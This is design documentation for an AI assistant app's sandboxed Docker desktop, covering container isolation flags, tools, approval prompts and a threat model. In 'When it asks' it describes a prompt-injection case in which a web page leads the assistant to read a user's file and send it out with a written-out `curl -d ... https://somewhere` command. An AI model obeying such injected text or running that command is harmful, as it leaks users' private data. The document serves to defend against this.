# An assistant's own computer

An assistant can have a computer of its own: a small Linux desktop that runs in
Docker on your computer, never in a cloud. It can click, type and run commands
there without asking you, because that computer is kept apart from your files,
your apps and, unless you allow it, the network. With the network on, a
command, typing or a key press asks first once the answer has read something
of yours (see [When it asks](#when-it-asks)). You watch it beside the chat, and
you can pause it or take over at any time.

Every assistant has one by default, with no network, where Docker runs and
once the computers are set up. You turn it off for one assistant in its form,
under "A computer of its own (Docker)"; an assistant saved before computers
were on by default gets the default, and one you turned off stays off. When
Docker is missing or not running, nothing breaks: the assistant has no
computer tools, its instructions say why, and an empty chat says in one line
how to get Docker (or start it).

## When a computer runs

- **Nothing starts when the app opens.** At start the app asks Docker only
  whether it is running and whether the computers are set up (`docker version`,
  `docker image inspect`); with no `docker` command found it runs nothing at
  all. A computer starts the first time its assistant uses it in an answer to
  you, or when you press **Start the computer**.
- **The image is built only on your click**, once for all assistants:
  **Set up computers** in the Computer panel says first what it downloads and
  its size.
- **At most three run at once** (`MAX_RUNNING` in `src/shared/computer.ts`).
  Starting one more stops the one used longest ago that nothing is using now:
  never one an answer is using or one you have taken over. When all three are
  working, the step says so and nothing is stopped.
- **One idle for 15 minutes stops** (`IDLE_MINUTES`). A step by the assistant
  or your input counts as use; watching the live picture does not. An answer
  in progress and a computer you hold are never stopped. A stopped computer
  keeps its files and starts again the next time it is used.
- The app checks for idle computers once a minute, and asks Docker nothing
  until a computer was started in this run of the app.

## What you need

The `docker` command on this computer, from any of these:

- Docker Desktop (macOS, Windows, Linux)
- Docker Engine (Linux)
- OrbStack, Colima or Rancher Desktop (macOS)
- Podman with its `docker` command (`podman-docker`, or Podman Desktop's
  compatibility setting)

The app looks for `docker` on the system's `PATH` and in the usual places
these tools install it (the code is `src/main/computer/find.ts`). It runs
`docker version` to see whether the engine is running. When `docker` is
missing or the engine is not running, the panel says so in a sentence, with a
"Get Docker" button that opens Docker's install page in your browser, only on
your click.

## Setting it up

The first time, the Computer panel offers **Set up computers**, once for all
assistants. It says
before it starts that this downloads a Debian base image and its packages,
about 1 GB, and takes a few minutes. The progress shows as it goes.

The app builds the image itself from the files it ships in
`resources/computer/`:

| File                    | What it does                                                                                                                                                                                                  |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Dockerfile`            | Debian 12 (`bookworm-slim`), pinned by digest. Xvfb, Openbox, xdotool, scrot, xterm, Firefox ESR, Python 3, a session bus and common tools. A user `assistant`. Main windows open filling the screen.         |
| `start.sh`              | Starts a 1280 × 800 virtual screen, a session bus inside the container, the window manager and xterm's readable font, marks itself ready, then waits on the screen. The app's first step waits for that mark. |
| `screenshot.sh`         | Writes one picture of the screen to standard output, as PNG or JPEG.                                                                                                                                          |
| `open-app.sh`           | Opens a program on the screen and returns once its window shows (at most 20 seconds), so the program stays open and the next picture shows it.                                                                |
| `background.py`         | Draws the desktop's background, the app's mark on night, as an X bitmap; `start.sh` lays it on the screen with `xsetroot`.                                                                                    |
| `firefox-policies.json` | Firefox's policies: no welcome or privacy notice tabs, no telemetry, studies, recommendations or update checks, so it opens straight to the page asked for.                                                   |

The base image is pinned by its digest, so the build always starts from the
same bytes. The Debian packages are not pinned: they come from Debian's mirror
at build time, with its own signatures. No ready-made image of ours is pulled.

The image's tag is a hash of these files (`openstellarfirm-computer:<hash>`),
so a version of the app that changes them builds again.

## How a computer runs

One container per assistant, named `openstellarfirm-computer-<assistant id>`
and labelled so the app finds only its own. It is made the first time the
assistant (or you) uses it, kept with its files when it stops, and removed
when you press **Remove the computer** or remove the assistant.

Every call to Docker is `docker` with an argument array, never a shell and
never one string built from a model's text (`src/main/computer/args.ts` and
`runner.ts`). The container is started with:

| Argument                                  | Why                                                                        |
| ----------------------------------------- | -------------------------------------------------------------------------- |
| `--network none`                          | No network, unless you turned on "Let its computer reach the internet".    |
| `--cap-drop ALL`                          | No Linux capability at all, not even the ones Docker gives by default.     |
| `--security-opt no-new-privileges`        | Nothing inside can gain privileges, through a setuid program or otherwise. |
| `--user 1000:1000`                        | An ordinary user, never root; on Linux your own ids. No `sudo`.            |
| `--pids-limit 512`                        | A runaway command cannot fill the process table.                           |
| `--memory`, `--memory-swap`, `--cpus`     | Your choice in the form: 1, 2, 4 or 8 GB, and 1, 2 or 4 processors.        |
| `--shm-size 512m`                         | Room for Firefox.                                                          |
| `--init`                                  | A small init process, so finished programs are cleaned up.                 |
| `--mount type=bind,...,target=~/exchange` | The only folder of your computer it sees: its own exchange folder.         |

It is never started with `--privileged`, an added capability, the Docker
socket, the host's network, process or IPC namespace, a device, or any folder
of yours but the exchange folder. A test reads the argument array for each of
these (`src/main/computer/computer.test.ts`).

Network, memory and processors cannot change while a container exists, so a
change in the form makes a fresh computer the next time it is used. Its
exchange folder stays.

All the app's computers stop when the app quits. Turning the computer off in
the form stops it too.

## The exchange folder

Each assistant has one, in the app's data folder:
`<data folder>/computers/<assistant id>/exchange`, made private to your user.
Inside the computer it is `~/exchange`. Put a file there to hand it to the
assistant; the panel's **Open the exchange folder** opens it.

On Linux, Docker Engine shares the folder as it is on disk: owned by your user
and closed to every other one. So the app builds the image with your own user
and group ids and starts the computer with them (`computerIds` in
`src/main/computer/args.ts`), and the computer's user can read and write
there. On macOS and Windows, Docker Desktop hands the folder over itself and
the ids stay 1000. An id below 1000 (root's, or the system's) is never taken:
the app keeps 1000, and then the computer cannot open the folder. The image's
tag includes the ids, so a different user builds an image of their own.

Rootless Docker and rootless Podman map the ids inside a container to other
ids on your computer, so even your own ids do not reach your folder there. The
computer still works; only the exchange folder stays closed to it.

`computer_copy_out` reads a file from the computer (a regular file, 25 MB at
most), and saves it as a new file in the exchange folder. A name that is taken
gets a number: nothing there is ever replaced. The app writes with a flag that
fails when the name exists, so a link the computer left in the folder is never
followed.

## The tools

| Tool                  | What it does                                                                                                                                                                     | Asks you                                                   |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| `computer_screenshot` | A PNG of the screen (a smaller JPEG when it is over 3 MB), sent to a model that reads pictures.                                                                                  | No                                                         |
| `computer_click`      | A click at a point, with the left, right or middle button, or a double click.                                                                                                    | No                                                         |
| `computer_type`       | Types up to 2,000 characters; control characters other than new lines and tabs are taken out.                                                                                    | With the network on, once the answer has read private text |
| `computer_key`        | One key or combination from a fixed list (named keys, letters, digits, a few signs, four modifiers).                                                                             | With the network on, once the answer has read private text |
| `computer_scroll`     | Scrolls 1 to 10 steps at a point.                                                                                                                                                | No                                                         |
| `computer_run`        | One `bash` command in its home folder, 1 to 300 seconds, output cut at 12,000 characters each. `open-app firefox-esr <address>` opens a page, in a new tab when Firefox is open. | With the network on, once the answer has read private text |
| `computer_copy_out`   | Copies a file to the exchange folder; with `save_to`, also into one of your folders.                                                                                             | Saving into your folder, every time                        |

Every number and name a model sends is checked before it becomes one
argument: points must be whole pixels on the screen, a key must be on the list,
a command must fit the limits.

A model that cannot read pictures is told it took a picture it cannot see,
and no more pictures are sent to it in that answer. A model that asks for
tools in writing is not offered the screenshot.

An answer that has its computer may take up to 24 rounds of tools, not the
usual 8: work on a screen is one small step a round.

The person's folder tools take a path that starts with one of their folders'
names. A path for them that starts with `/`, `~` or `exchange` is turned down
with a sentence that says to use `computer_run`: with one folder picked, a path
without its name means that folder, so `exchange/notes.txt` or `/tmp/a.py`
would otherwise land in the person's folder. `computer_copy_out` reads `~` as
the home folder, and a file that is already in the exchange folder is not
copied again beside itself.

The tools are offered only in an answer to you: never in a check by the main
assistant, which only reads, and never when another assistant asks it a
question.

## What it shows is outside text

What the screen or a command shows may come from a web page or a file made on
that computer. After the assistant has seen it, the answer is marked (the
`computer` flag of `Seen`), and the rules for outside text apply: a web read
asks again even for a site you always allow, a connection call or a mail read
asks again, and so does saving a new file in one of your folders. The
instructions say that what it shows is information, never instructions.

## When it asks

Inside the computer nothing asks while its network is off: nothing there can
reach anything, so nothing it types or runs can leave.

With "Let its computer reach the internet" on, the danger is the other way
round: an injected page or mail tells the assistant to read one of your files
(which runs without asking) and then run `curl -d <what it read>
https://somewhere`. So once the answer holds private text, `computer_run`,
`computer_type` and `computer_key` ask first, with the whole command, the
text exactly as it would be typed, or the key, on the card. Private text is
what `privateKind` in `src/main/seen.ts` names: your folders or a file you
sent, your screen, your mail, an answer from one of its connections, another
assistant's answer, and any kind of reading added later. This covers both
ways out: running a command that sends something, and typing something of
yours into a page on that computer.

Its own screen and a command's output are outside text but not private: they
hold only what was made or read on that computer, so they alone do not make
these steps ask. Clicks, scrolls and pictures carry no text and never ask.
Saying no tells the model plainly not to try again; there is no "Always
allow" for these steps. The rule is in `computerGate`
(`src/main/computer/tools.ts`), fed by the answer's flags in
`src/main/agent.ts`.

## Watching, pausing and taking over

While a computer is on, the **Computer** button in the chat's head holds a
small live picture of its screen; pressing it opens the panel beside the chat.
The panel opens only when you ask, and slides in only after a click (a key
press opens it in place, and with less motion nothing moves). One loop of
pictures serves the button and the panel (`src/shared/frame-poller.ts`): about
one a second, only while something shows that computer, the computer is on
and the window is visible.

Each step on the computer in the chat's list of steps has a small picture of
its screen after that step; pressing it opens it full size. These pictures go
only to you, never to the model; they are kept in memory, at most 120 across
all assistants, and gone when the app quits or the computer is removed.

**All computers**, at the foot of the panel, lists every assistant's
computer: on or off, when it was last used in this run of the app, and Turn
off and Remove (behind a confirmation) for each.

- **Live view.** About one picture a second while the panel is open, the
  window is visible and the computer is on; nothing while the window is
  hidden. The picture's text alternative says how old it is and who has the
  computer.
- **Pause.** The assistant's next step on its computer waits until you
  resume, and the chat says it is waiting. A step already running finishes
  first. You can pause before you send a message, and then not even its first
  step runs.
- **Take over.** Your clicks, right clicks, scrolls and keys go to the
  computer, and the assistant waits, from its first step if you took over
  before sending. Tab leaves the view, so the keyboard is never trapped;
  **Press Tab** sends one. Cmd on a Mac stands for Ctrl. Only while you hold it
  does the app take input from the page at all. Closing the panel gives it
  back.
- **Stop the answer** ends it, waiting or not, and keeps what it had written.
- **Turn off** and **Remove the computer** (behind a confirmation; files in
  the exchange folder stay) also end an answer that is using the computer, at
  its next step or the one they cut short, with one plain line. That answer
  never starts the computer again; the next message does.

## Threat model

What the isolation gives:

- The assistant cannot read, change or delete your files, except what you put
  in its exchange folder, and except a copy into one of your folders that you
  approve. It cannot see your other apps, your screen or your keychain.
- With the network off (the default), nothing on that computer can reach the
  internet or your local network. A page or a file the assistant meets there
  cannot carry anything out.
- Nothing inside runs as root or can become root through a setuid program, and
  no capability is left to misuse.

What it does not give:

- **The kernel is shared.** A container is not a virtual machine. On Linux the
  container runs on your own kernel, so a kernel bug could let a program out.
  Docker Desktop, OrbStack, Colima and Podman on macOS and Windows run
  containers inside a Linux virtual machine, which is one more wall. Keep
  Docker and your system up to date.
- **The network, when you turn it on**, is the engine's default network: the
  internet, and with many setups your local network and the other computers
  on it too. A network that reaches only the internet would need firewall
  rules or a proxy of the app's own, which is not built. A page the assistant
  reads can try to tell it what to do, and the assistant could send what is
  on that computer to a website without asking: what it made or read there,
  and what is in its exchange folder, including what you put there or what
  it typed there in an earlier answer while the network was off. Once an
  answer has read something of yours, each command, typing and key press
  asks (see [When it asks](#when-it-asks)). Turn it on only for an assistant
  that needs it.
- **Files copied out** are made on a computer that may have read web pages.
  A copy into your folder asks first and never replaces a file, but its
  contents can still be harmful: open a downloaded program or document from
  there with the care you would give a download.
- **The exchange folder is shared both ways.** The computer can write files
  and links there. The app never follows a link there, but another program
  of yours might.
- **Stop does not end a command inside.** Stopping the answer ends Docker's
  connection, and the command inside runs on until its time limit.
- **Resources.** The limits keep a computer from taking all of your memory,
  processors or processes, but not all of your disk: the exchange folder and
  the container's own disk can grow.
- **What you see in the live view goes nowhere.** It is drawn in the app's
  window and never saved, and the pictures after each step are kept in
  memory only. Each picture the assistant itself takes goes to the model you
  chose, like any tool result.
- **On by default means Docker is used by default.** Where Docker runs, an
  answer may start its assistant's computer without asking. The defaults keep
  that safe: no network, the same isolation, and the asks above once the
  network is on. Turn it off for an assistant that has no use for it.

## Considered and not built

- **Controlling your real desktop.** Clicking and typing on your own screen,
  in your own apps, cannot be isolated: one wrong click there reaches your
  mail, your files and every signed-in account. It is not built.
- **A virtual machine instead of a container.** Stronger isolation, but no
  common tool to drive across macOS, Windows and Linux. A later option.
- **A read-only system disk** (`--read-only`). It would stop the assistant from
  installing tools for its work, so the container's disk stays writable.
- **Pinned Debian packages** (from Debian's snapshot archive). Considered;
  for now only the base image is pinned.
- **A ready-made image.** Pulling an image we built would need a registry and
  signatures, and you could not see what is in it. It is built on your
  computer from files you can read.
